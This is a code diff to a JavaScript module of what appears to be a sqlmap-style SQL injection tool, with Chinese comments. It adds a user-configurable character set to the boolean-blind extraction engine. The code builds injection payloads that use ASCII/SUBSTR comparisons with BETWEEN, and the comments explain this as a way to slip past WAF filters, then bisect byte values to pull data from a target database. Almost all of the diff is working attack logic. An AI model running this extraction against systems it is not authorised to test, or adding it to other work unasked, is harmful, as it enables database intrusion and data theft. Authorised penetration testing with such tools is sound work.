@@ -17,6 +17,8 @@ import {
 import { buildDynamicSimilarGated } from './Detector.js';
 import { binaryProbe } from './binaryProbe.js';
 import { responseSkeleton, stripEchoedPayload } from './echoStrip.js';
+// [D202 对标 sqlmap --charset] 字符类区间由用户字符集推导；默认是原硬编码的两类（零回归）
+import { charsetRanges, classProbeStep } from './charsetRanges.js';
 
 // [P2 审计修复 2026-09-22 真引擎实测] 方言函数字典查询：**显式 null = 结构性不支持**，
 // 必须**直接降级**，不得用 `|| XXX.MySQL` 回落成 MySQL 语法。
@@ -38,7 +40,7 @@ function pickDialectFn(dict, dbms, fallbackKey = 'MySQL') {
 // [D50 2026-10-12] 提取阶段比较算子（--fetch-using）：'gt'（默认）| 'between'
 //
 // 动机：`>` / `<` 被 WAF / 规则过滤而 BETWEEN 仍放行的目标上，默认算子让长度二分与
-// 字节二分全程判假 ⇒ 提取静默失败。本仓的 cls 字符类探测（cls-digits/cls-lower）
+// 字节二分全程判假 ⇒ 提取静默失败。本仓的 cls 字符类探测（[D202] 区间来自 --charset，默认数字/小写字母）
 // **早已单方面依赖 BETWEEN 可用**——那条通道的静默失败正是本开关要堵的洞：
 // 类探测失准只会让收敛值越界，再由 extractVerify 等值验证兜底回退，代价是请求数。
 //
@@ -297,23 +299,26 @@ export async function extractBoolean(ex, ctx, expr) {
   // （重测跳过类探测，直接全区间二分，与旧行为一致），无回归。
   async function _extractBytesBisect(ex, ctx, plan, expr, len) {
     const { base, K, extractVerify, fetchUsing, asciiFn, subFn } = plan;
+    // [D202] --charset：类探测区间由用户字符集推导；未配置时与原 [48,57]/[97,122] 逐值等价。
+    const ranges = charsetRanges(ctx.config && ctx.config.charset);
     const bytes = new Array(len).fill(0);
     const judge = _dynJudge(ex, ctx);
     let anyAbandoned = false; // 有字节因重试超限被放弃 → 最终值标低置信
-    /** @type {Array<{ pos: number; lo: number; hi: number; phase: string; _mid?: number; _err?: any; _retries?: number }>} */
+    /** @type {Array<{ pos: number; lo: number; hi: number; phase: string; clsIdx: number; _mid?: number; _err?: any; _retries?: number }>} */
     const st = Array.from({ length: len }, (_, i) => ({
       pos: i + 1,
       lo: 0,
       hi: 255,
-      phase: 'cls-digits', // cls-digits → cls-lower → bisect
+      phase: 'cls', // 按 ranges 逐个试类探测 → bisect（默认两类等价旧行为）
+      clsIdx: 0,
       // _mid / _err / _retries 由下方批处理循环按需填充（非必填，不改变既有行为）
     }));
     let remaining = st.slice(); // 未完成（未收敛）位置；每轮取前 K 个并发探测，未收敛的回插队尾
     while (remaining.length) {
       const batch = remaining.splice(0, K);
       const reqs = batch.map((s) => {
-        if (s.phase === 'cls-digits' || s.phase === 'cls-lower') {
-          const [a, b] = s.phase === 'cls-digits' ? [48, 57] : [97, 122];
+        if (s.phase === 'cls') {
+          const [a, b] = ranges[s.clsIdx];
           return `${base} AND (${asciiFn(subFn(expr, s.pos))} BETWEEN ${a} AND ${b})-- -`;
         }
         const mid = Math.floor((s.lo + s.hi) / 2);
@@ -364,18 +369,9 @@ export async function extractBoolean(ex, ctx, expr) {
         }
         // [P0-FIX] 判定走动态块感知通道：动态页下「与 false 基准仅动态块差异」不再误判为真
         const ok = judge.truthy(resp, falseData, reqs[k]);
-        // —— 字符类探测阶段（charset 收窄）：命中则收窄区间，未命中试下一类 / 回退全区间 ——
-        if (s.phase === 'cls-digits' || s.phase === 'cls-lower') {
-          if (ok) {
-            const [a, b] = s.phase === 'cls-digits' ? [48, 57] : [97, 122];
-            s.lo = a;
-            s.hi = b;
-            s.phase = 'bisect';
-          } else if (s.phase === 'cls-digits') {
-            s.phase = 'cls-lower'; // 数字未命中 → 试小写字母区间
-          } else {
-            s.phase = 'bisect'; // 两类都未命中 → 回退全区间 [0,255]（原行为）
-          }
+        // —— 字符类探测阶段（[D202] 区间来自 --charset；默认两类与旧行为一致）——
+        if (s.phase === 'cls') {
+          classProbeStep(s, ok, ranges); // 命中收窄 / 未命中试下一区间 / 全不中回退全区间
           remaining.push(s); // 类探测后未收敛，回插队尾继续二分
           continue;
         }
